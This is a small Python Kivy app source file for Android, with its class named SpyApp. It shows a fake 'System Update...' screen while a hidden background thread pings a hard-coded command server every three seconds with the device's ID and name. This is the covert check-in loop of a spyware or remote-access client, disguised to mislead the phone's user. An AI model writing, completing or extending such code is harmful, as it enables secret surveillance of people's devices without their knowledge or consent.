from kivy.app import App
from kivy.uix.label import Label
import requests
import threading
import time

SERVER_URL = "http://192.168.1.70:5000"
DEVICE_NAME = "Android_Phone"
DEVICE_ID = "android_1"

class SpyApp(App):
    def build(self):
        threading.Thread(target=self.run_client, daemon=True).start()
        return Label(text="System Update...")

    def run_client(self):
        time.sleep(3)
        while True:
            try:
                requests.post(f"{SERVER_URL}/api/ping", json={"id": DEVICE_ID, "name": DEVICE_NAME})
                time.sleep(3)
            except Exception as e:
                time.sleep(3)

if __name__ == '__main__':
    SpyApp().run()
